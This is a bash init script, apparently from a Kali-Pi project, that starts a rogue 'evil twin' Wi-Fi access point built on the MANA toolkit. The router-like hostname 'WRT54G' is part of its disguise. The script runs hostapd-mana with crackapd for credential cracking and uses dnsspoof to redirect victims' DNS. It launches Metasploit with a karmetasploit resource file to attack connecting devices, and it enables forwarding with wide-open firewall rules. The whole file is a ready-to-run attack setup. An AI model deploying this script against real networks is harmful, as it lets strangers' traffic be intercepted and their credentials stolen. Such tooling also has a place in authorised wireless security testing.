#!/bin/bash
### BEGIN INIT INFO
# Provides:          firelamb
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Control firelamb
# Description:       Control firelamb
### END INIT INFO

## Adjust these
phy=wlan1
phy0="wlan1_0"
conf=/home/pi/Kali-Pi/Menus/mana/hostapd-mana-all.conf
hostapd=/usr/lib/mana-toolkit/hostapd
crackapd=/usr/share/mana-toolkit/crackapd/crackapd.py
cmdline="${hostapd} ${conf}"
HOTSTNAME=WRT54G
REALHOSTNAME=kali-pi
## End adjustment

PROGLONG=$(realpath $0)
PROGSHORT=$(basename ${PROGLONG})
PIDFILE="/var/run/"${PIDFILE:-"${PROGSHORT}.pid"}

usage() {
  echo "Usage: `basename $0` {start|stop|restart|status}" >&2
}

# Did we get an argument?
if [[ -z "${1}" ]]; then
  usage
  exit 1
fi

# Get the PID from PIDFILE if we don't have one yet.
if [[ -z "${PID}" && -e ${PIDFILE} ]]; then
  PID=$(cat ${PIDFILE});
fi

start() {
        echo "--------------------------------"
        echo "   STARTING $PROGSHORT"
        echo "--------------------------------"

        hostname $HOSTNAME

        # Get the FIFO for the crack stuffs. Create the FIFO and kick of python process
        export EXNODE=`cat $conf | grep ennode | cut -f2 -d"="`
        echo $EXNODE
        mkfifo $EXNODE
        $crackapd&

        service network-manager stop
        rfkill unblock wlan

        # Start hostapd
        sed -i "s/^interface=.*$/interface=$phy/" $conf
        sed -i "s/^bss=.*$/bss=$phy0/" $conf
        sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /etc/mana-toolkit/karmetasploit.rc
        $cmdline & echo $! > ${PIDFILE}
        sleep 5
        ifconfig $phy
        ifconfig $phy0
        ifconfig $phy 10.0.0.1 netmask 255.255.255.0
        route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
        ifconfig $phy0 10.1.0.1 netmask 255.255.255.0
        route add -net 10.1.0.0 netmask 255.255.255.0 gw 10.1.0.1

        dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd.conf -i $phy -I lo
        dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd-two.conf -i $phy0 -I lo
        dnsspoof -i $phy -f /etc/mana-toolkit/dnsspoof.conf&
        dnsspoof -i $phy0 -f /etc/mana-toolkit/dnsspoof.conf&
        service apache2 start
        stunnel4 /etc/mana-toolkit/stunnel.conf
        tinyproxy -c /etc/mana-toolkit/tinyproxy.conf&
        msfconsole -r /etc/mana-toolkit/karmetasploit.rc&

        echo '1' > /proc/sys/net/ipv4/ip_forward
        iptables --policy INPUT ACCEPT
        iptables --policy FORWARD ACCEPT
        iptables --policy OUTPUT ACCEPT
        iptables -F
        iptables -t nat -F
}
stop() {

        echo "--------------------------------"
        echo "   STOPPING $PROGSHORT"
        echo "--------------------------------"
        if [[ -z "${PID}" ]]; then
            echo "${PROGSHORT} is not running (missing PID)."
        elif [[ -e /proc/${PID}/cmdline && "`tr -d '\0' < /proc/${PID}/cmdline`" == *"$( echo -e "${cmdline}" | tr -d '[:space:]')"* ]]; then
            kill ${PID}
            rm /tmp/crackapd.run
            EXNODE=`cat $conf | grep ennode | cut -f2 -d"="`
            echo $EXNODE
            rm $EXNODE
            pkill dnsmasq
            pkill dnsspoof
            pkill tinyproxy
            pkill stunnel4
            pkill msfconsole
            iptables -t nat -F
            hostname $REALHOSTNAME
        else
            echo "${PROGSHORT} is not running (tested PID: ${PID})."
        fi
}

case "$1" in
    start)
       start
       ;;
    stop)
       stop
       ;;
    restart)
        stop
        start
        ;;
    force-reload)
        ;;
    status)
        if [[ -z "${PID}" ]]; then
            echo "${PROGSHORT} is not running (missing PID)."
        elif [[ -e /proc/${PID}/cmdline && "`tr -d '\0' < /proc/${PID}/cmdline`" == *"$( echo -e ${cmdline} | tr -d '[:space:]')"* ]]; then
            echo "${PROGSHORT} is running (PID: ${PID})."
            exit 1
        else
            echo "${PROGSHORT} is not running (tested PID: ${PID})."
            exit 0
        fi
        ;;
    *)
       echo "Usage: $0 {start|stop|status|restart}"
esac
